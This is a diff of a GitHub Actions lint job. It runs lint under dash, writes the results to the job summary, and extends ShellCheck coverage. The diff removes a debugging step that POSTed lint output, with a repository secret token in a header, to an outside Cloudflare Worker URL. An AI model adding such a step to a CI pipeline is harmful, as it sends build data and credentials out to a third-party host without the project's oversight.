@@ -29,15 +29,17 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      # lint 用的是 bash 4 的数组/[[ ]]（tests/smoke.sh 就是这么写的），
-      # GitHub 的 ubuntu runner 默认 sh 是 dash，bash -n 会把它们当成语法错误。
-      # runner 自带 bash 5.x，这里先把它报出来，失败时好判断是谁的问题。
-      - name: Bash
-        run: bash --version | head -1
+      # 报一下解释器版本，失败时好判断是谁的问题：
+      #   * lint 自己必须能在 dash 下跑（下方用 sh 调它，跟"被随便谁调用"等价）；
+      #   * tests/smoke.sh 是 bash 脚本，lint 按 shebang 分流才用 bash -n 判它。
+      - name: Shells
+        run: |
+          sh --version 2>&1 | head -1 || true
+          readlink -f /bin/sh || true
+          bash --version | head -1
 
-      # 跑 lint 需要 node：脚本里的 "Node syntax" 与 docs_claims.js 两段都要它，
-      # 没有 node 时前者在 set -u 下直接跳段、后者变成 SKIP，等于两个检查都不存在。
-      # 版本跟镜像一致（Dockerfile 用 node:20-alpine）。
+      # lint 需要 node（"Node syntax" 与 docs_claims.js 两段）。没有 node 时
+      # lint 会明确报 FAIL，不会再静默跳段。版本跟镜像一致（node:20-alpine）。
       - name: Node
         uses: actions/setup-node@v4
         with:
@@ -47,51 +49,38 @@ jobs:
       #   - LF-only line endings for every text file (catches a CRLF checkout,
       #     which silently breaks the shebang of entrypoint.sh inside the image)
       #   - no UTF-8 BOM on scripts
-      #   - bash -n on every *.sh, node --check on every *.js (no hand-kept list,
-      #     so a new shim/*.js can never be silently left unchecked)
+      #   - shell syntax on every *.sh, judged by the interpreter its shebang
+      #     declares; node --check on every *.js (no hand-kept list, so a new
+      #     shim/*.js can never be silently left unchecked)
       #   - the executable bit on the entrypoints
       #
-      # 我这边取不到 job log（/actions/.../logs 匿名 403），而 lint 一失败整个
-      # job 就断了，只能看到 "Process completed with exit code 1"。所以把 lint
-      # 的完整输出写进 job summary，再单跑 docs_claims.js 看是不是它先挂的。
-      # 等日志可读了，这两步就可以删。
-      - name: Probe the lint environment
-        continue-on-error: true
-        env:
-          CF_TOKEN: ${{ secrets.CF_TOKEN }}
-        run: |
-          # 只为了能看到 lint 的真实输出：本机拿不到 job log（匿名 403），
-          # 而 lint 一失败 job 就断。把输出切块 POST 到 Cloudflare Worker
-          # （Cloudflare 到 runner 的链路稳定，我这边到 qf-static 也稳定）。
-          # 没有配置 CF_TOKEN 时这一步什么也不做。
-          if [ -z "${CF_TOKEN:-}" ]; then
-            echo 'no CF_TOKEN, skipping'; exit 0
-          fi
-          OUT="$RUNNER_TEMP/lint.out"
-          bash tests/lint.sh > "$OUT" 2>&1; echo "exit=$?" >> "$OUT"
-          OUT_FILE="$OUT" python3 - <<'PY'
-          import json, os, urllib.request
-          body = open(os.environ["OUT_FILE"], encoding="utf-8", errors="replace").read()
-          tok = os.environ["CF_TOKEN"]
-          url = "https://c2a-probe.repo-sync.workers.dev/log"
-          for i in range(0, len(body), 6000):
-              chunk = body[i:i+6000]
-              req = urllib.request.Request(url,
-                  data=json.dumps({"name": os.environ.get("GITHUB_SHA", "")[:8],
-                                   "i": i, "text": chunk}).encode(),
-                  headers={"content-type": "application/json", "x-token": tok},
-                  method="POST")
-              urllib.request.urlopen(req, timeout=20).read()
-          PY
-
+      # 用 sh 调 lint，而不是 bash：lint 的契约是"任何 POSIX sh 都能跑"，
+      # 而 CI 若用 bash 调它，bash 专有语法就永远暴露不了——上一轮红了一整天
+      # 正是这么来的（脚本里写了 <<<，bash 能解析，dash 连解析都不做）。
+      # 结果写进 job summary：拿不到 job log 时也能看到是哪一条在报错。
       - name: Repo lint
-        run: bash tests/lint.sh
+        run: |
+          OUT="$RUNNER_TEMP/lint.out"
+          # 这里的 bash 只负责管上面那个管道；lint 自己必须由 sh(dash) 跑。
+          set -o pipefail
+          sh tests/lint.sh 2>&1 | tee "$OUT"
+          ec=$?
+          {
+            echo '### Repo lint'
+            echo
+            echo '```'
+            sed 's/\x1b\[[0-9;]*m//g' "$OUT"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+          exit "$ec"
 
       - name: ShellCheck
         run: |
           sudo apt-get update -qq
           sudo apt-get install -y -qq shellcheck
-          shellcheck --severity=error tests/smoke.sh deploy.sh shim/entrypoint.sh
+          # lint.sh 现在声明 /bin/sh，也纳入检查；auth_probe.sh 是给容器里跑的探针。
+          shellcheck --severity=error \
+            tests/lint.sh tests/smoke.sh deploy.sh shim/entrypoint.sh tests/auth_probe.sh
 
   build-test-publish:
     runs-on: ubuntu-latest
